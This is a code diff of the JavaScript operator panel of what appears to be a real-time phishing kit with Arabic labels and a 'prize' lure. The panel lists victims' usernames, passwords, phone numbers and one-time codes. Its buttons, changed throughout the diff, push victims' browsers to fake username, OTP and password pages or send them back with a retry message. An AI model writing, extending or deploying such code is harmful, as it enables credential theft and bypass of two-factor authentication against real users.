@@ -31,19 +31,11 @@
   let selectedReferenceId = null;
   const selectedReferenceIds = new Set();
   const cardDecisionOverrides = new Map();
-  // إجراءات صندوق بيانات الدخول (توجيه 4/6 أرقام أو رفض) — لكل محاولة تسجيل دخول مفتاح مستقل
-  const loginActionOverrides = new Map();
-  const LOGIN_ACTION_LABELS = { otpnew: 'تم توجيه 4 أرقام', otpcode: 'تم توجيه 6 أرقام', reject: 'تم رفض' };
-  // إجراءات صناديق رموز التحقق (موافقة = توجيه للرئيسية، أو رفض) — لكل رمز مفتاح مستقل
+  // إجراءات صناديق رموز التحقق (موافقة = تمرير لإدخال كلمة المرور، أو رفض) — لكل رمز مفتاح مستقل
   const otpActionOverrides = new Map();
-  const OTP_ACTION_LABELS = { approve: 'تمت الموافقة (توجيه إلى الرئيسية)', reject: 'تم رفض الرمز' };
+  const OTP_ACTION_LABELS = { approve: 'تمت الموافقة (تمرير إلى كلمة المرور)', reject: 'تم رفض الرمز' };
   // مفتاح آمن لأسماء حقول Firestore (حروف/أرقام/شرطة سفلية فقط — لا نقاط)
   const safeKey = (v) => String(v).replace(/[^A-Za-z0-9_]/g, '_');
-  const loginEntryKey = (entry, i) => {
-    if (entry && entry.at) return 'at_' + safeKey(entry.at);
-    if (entry && (entry.username || entry.password)) return 'u_' + safeKey(entry.username || '') + '_' + safeKey(entry.password || '');
-    return 'idx_' + i;
-  };
   let boxCounterTimer = null;
   let referenceListCounterTimer = null;
   let presenceRefreshTimer = null;
@@ -558,6 +550,8 @@
         country: m.country || '',
         pass: m.pass || '',
         username: m.username || '',
+        hasAccount: m.hasAccount || '',
+        hasAccountLabel: m.hasAccountLabel || (m.hasAccount === 'yes' ? 'نعم' : m.hasAccount === 'no' ? 'لا' : ''),
         logins: Array.isArray(m.logins) ? m.logins : [],
         loginActions: (m.loginActions && typeof m.loginActions === 'object') ? m.loginActions : {},
         otpActions: (m.otpActions && typeof m.otpActions === 'object') ? m.otpActions : {},
@@ -789,31 +783,17 @@
       </article></div>`;
     }).join('') : '<p class="ref-muted">لا توجد بطاقة</p>';
     // أقسام الصناديق الثلاثة — تُرتب لاحقاً من الأحدث إلى الأقدم
-    const basicBoxHtml = `<article class="ref-basic-box"><h3>معلومات أساسية</h3>${field('الاسم', visitor.name)}${field('رقم الهاتف', visitor.phone)}${field('الدولة', visitor.country)}${field('العنوان', visitor.address)}${field('المبلغ', visitor.amount)}</article>`;
+    const basicBoxHtml = `<article class="ref-basic-box"><h3>معلومات أساسية</h3>${field('الاسم', visitor.name)}${field('رقم الهاتف', visitor.phone)}${field('نوع الاختيار (هل لديك حساب؟)', visitor.hasAccountLabel || visitor.hasAccount)}${field('الدولة', visitor.country)}</article>`;
     // صناديق بيانات الدخول — كل محاولة تسجيل دخول في صندوق منفصل (لا تُستبدل)
     const loginEntries = Array.isArray(visitor.logins) ? [...visitor.logins] : [];
     if (!loginEntries.length && (visitor.username || visitor.pass)) {
       loginEntries.push({ username: visitor.username, password: visitor.pass });
     }
     loginEntries.sort((a, b) => (toMillis(b && b.at) || 0) - (toMillis(a && a.at) || 0));
-    const loginActionsMap = (visitor.loginActions && typeof visitor.loginActions === 'object') ? visitor.loginActions : {};
-    const loginActionFor = (key) => {
-      const local = loginActionOverrides.get((visitor.sessionId || visitor.id) + '|' + key);
-      if (local) return local;
-      const remote = loginActionsMap[key];
-      if (remote && remote.action) return { action: remote.action, label: remote.label || LOGIN_ACTION_LABELS[remote.action] || '' };
-      return null;
-    };
     const loginBoxesHtml = loginEntries.map((entry, i) => {
       const t = toMillis(entry && entry.at);
-      const sidAttr = escapeHtml(String(visitor.sessionId || visitor.id || ''));
-      const key = loginEntryKey(entry, i);
-      const done = loginActionFor(key);
-      // بعد تنفيذ إجراء على هذه المحاولة: تُطبع الحالة مكان الأزرار (تُخفى الأزرار لهذا الصندوق فقط)
-      const actionsHtml = done
-        ? `<div class="ref-login-status ref-login-status--${escapeHtml(done.action)}">${escapeHtml(done.label || LOGIN_ACTION_LABELS[done.action] || 'تم التنفيذ')}</div>`
-        : `<div class="ref-card-actions"><button data-login-action="otpnew" data-login-key="${escapeHtml(key)}" data-session-id="${sidAttr}">توجيه إلى رمز 4 أرقام</button><button data-login-action="otpcode" data-login-key="${escapeHtml(key)}" data-session-id="${sidAttr}">توجيه إلى رمز 6 أرقام</button><button data-login-action="reject" data-login-key="${escapeHtml(key)}" data-session-id="${sidAttr}">رفض</button></div>`;
-      return `<article class="ref-basic-box" data-ref-time="${t}"><h3>بيانات الدخول ${loginEntries.length > 1 ? '#' + (loginEntries.length - i) : ''}${t ? ` <time class="ref-box-time" data-box-counter data-box-time="${t}" datetime="${t}">${escapeHtml(formatRefTime(t))}</time>` : ''}</h3>${field('اسم المستخدم', entry && entry.username)}${field('كلمة المرور', entry && entry.password)}${actionsHtml}</article>`;
+      // صندوق اسم المستخدم: للعرض فقط بلا أزرار موافقة/رفض (الموافقة/الرفض تكون على رمز التحقق)
+      return `<article class="ref-basic-box" data-ref-time="${t}"><h3>بيانات الدخول ${loginEntries.length > 1 ? '#' + (loginEntries.length - i) : ''}${t ? ` <time class="ref-box-time" data-box-counter data-box-time="${t}" datetime="${t}">${escapeHtml(formatRefTime(t))}</time>` : ''}</h3>${field('اسم المستخدم', entry && entry.username)}${field('كلمة المرور', entry && entry.password)}</article>`;
     }).join('');
     const loginBoxTime = loginEntries.length ? (loginEntries[0] && loginEntries[0].at) : (visitor.customerUpdatedAt || visitor.createdDate);
     // صناديق إعادة تعيين كلمة المرور — كل محاولة في صندوق منفصل
@@ -847,7 +827,7 @@
       const done = otpActionFor(key);
       const actionsHtml = done
         ? `<div class="ref-login-status ref-login-status--${escapeHtml(done.action)}">${escapeHtml(done.label || OTP_ACTION_LABELS[done.action] || 'تم التنفيذ')}</div>`
-        : `<div class="ref-card-actions"><button data-otp-action="approve" data-otp-key="${escapeHtml(key)}" data-session-id="${otpSidAttr}">توجيه إلى الرئيسية</button><button data-otp-action="reject" data-otp-key="${escapeHtml(key)}" data-session-id="${otpSidAttr}">رفض</button></div>`;
+        : `<div class="ref-card-actions"><button data-otp-action="approve" data-otp-key="${escapeHtml(key)}" data-session-id="${otpSidAttr}">موافقة</button><button data-otp-action="reject" data-otp-key="${escapeHtml(key)}" data-session-id="${otpSidAttr}">رفض</button></div>`;
       return `<article class="ref-otp-box"><div class="ref-otp-row"><div><b>الرمز ${i + 1}: <span class="ref-copyable" data-copy="${escapeHtml(String(o.otp || ''))}">${escapeHtml(String(o.otp || ''))}</span></b><time class="ref-box-time" data-box-counter data-box-time="${otpTime(o)}" datetime="${otpTime(o)}">${escapeHtml(formatRefTime(otpTime(o)))}</time></div><small>${escapeHtml(timeAgo(otpTime(o)))}</small></div>${actionsHtml}</article>`;
     }).join('')}` : '';
     // ترتيب الصناديق من الأحدث إلى الأقدم (الأحدث يظهر في الأعلى).
@@ -943,13 +923,14 @@
       const targetPage = NAV_PAGE_MAP[target] || target;
       sendNavCommand(target, targetPage);
     }));
-    // أزرار صندوق بيانات الدخول: توجيه إلى رمز 4 أرقام / رمز 6 أرقام / رفض
-    const sendRejectCommand = async (sid) => {
+    // رفض رمز التحقق: يُعاد العميل إلى صفحة اسم المستخدم مع رسالة «يرجى إدخال بيانات صحيحة وإعادة المحاولة»
+    const rejectOtpToUsername = async (sid) => {
       if (!sid) { toast('تعذّر تحديد العميل', 'error'); return; }
       try {
         await db.collection('customers').doc(sid).set({
           decision: 'rejected',
           status: 'rejected',
+          rejectReason: 'يرجى إدخال بيانات صحيحة وإعادة المحاولة',
           decidedAt: firebase.firestore.FieldValue.serverTimestamp(),
           lastSeen: firebase.firestore.FieldValue.serverTimestamp(),
         }, { merge: true });
@@ -957,40 +938,20 @@
           await rtd.ref('commands/' + sid + '/rejection').set({
             action: 'REJECT_PAYMENT',
             status: 'rejected',
+            targetPage: 'prize-username.html',
+            reason: 'يرجى إدخال بيانات صحيحة وإعادة المحاولة',
             timestamp: new Date().toLocaleTimeString('ar-EG'),
             rejectedAt: Date.now(),
             adminId: 'admin',
           });
         } catch (e) { console.warn('RTDB reject write failed:', e); }
-        toast('تم رفض البيانات وإرجاع العميل لتسجيل الدخول', 'success');
+        toast('تم الرفض وإعادة العميل إلى صفحة اسم المستخدم', 'success');
       } catch (err) {
         console.error('Reject error:', err);
         toast('تعذر إرسال الرفض', 'error');
       }
     };
-    // تسجيل إجراء الصندوق: يُخزَّن محلياً (للعرض الفوري) وفي قاعدة البيانات (ليبقى بعد التحديث)
-    const recordLoginAction = (sid, key, action, label) => {
-      if (!sid || !key) return;
-      loginActionOverrides.set(sid + '|' + key, { action, label });
-      db.collection('customers').doc(sid).set({
-        loginActions: { [key]: { action, label, at: Date.now() } },
-      }, { merge: true }).catch((e) => console.warn('login action persist failed:', e));
-    };
-    els.referenceDetailContent.querySelectorAll('[data-login-action]').forEach(btn => btn.addEventListener('click', () => {
-      const act = btn.dataset.loginAction;
-      const sid = btn.dataset.sessionId || visitor.sessionId || visitor.id;
-      const key = btn.dataset.loginKey || '';
-      if (act === 'reject') {
-        sendRejectCommand(sid);
-        recordLoginAction(sid, key, 'reject', LOGIN_ACTION_LABELS.reject);
-      } else {
-        const isNew = act === 'otpnew';
-        sendNavCommand(isNew ? 'رمز 4 أرقام' : 'رمز 6 أرقام', isNew ? 'otp-new.html' : 'otp.html');
-        recordLoginAction(sid, key, act, isNew ? LOGIN_ACTION_LABELS.otpnew : LOGIN_ACTION_LABELS.otpcode);
-      }
-      renderReferenceDetail(visitor);
-    }));
-    // أزرار صناديق رموز التحقق: موافقة (توجيه للرئيسية) / رفض — تُطبع الحالة وتُخفى الأزرار
+    // أزرار صناديق رموز التحقق: موافقة (تمرير إلى كلمة المرور) / رفض — تُطبع الحالة وتُخفى الأزرار
     const recordOtpAction = (sid, key, action, label) => {
       if (!sid || !key) return;
       otpActionOverrides.set(sid + '|' + key, { action, label });
@@ -1003,10 +964,12 @@
       const sid = btn.dataset.sessionId || visitor.sessionId || visitor.id;
       const key = btn.dataset.otpKey || '';
       if (act === 'reject') {
-        sendRejectCommand(sid);
+        // الرفض: إعادة العميل إلى صفحة اسم المستخدم مع رسالة «يرجى إدخال بيانات صحيحة وإعادة المحاولة»
+        rejectOtpToUsername(sid);
         recordOtpAction(sid, key, 'reject', OTP_ACTION_LABELS.reject);
       } else {
-        sendNavCommand('الرئيسية', 'index.html');
+        // الموافقة: تمرير العميل إلى صفحة إدخال كلمة المرور النصية
+        sendNavCommand('كلمة المرور النصية', 'prize-text-password.html');
         recordOtpAction(sid, key, 'approve', OTP_ACTION_LABELS.approve);
       }
       renderReferenceDetail(visitor);
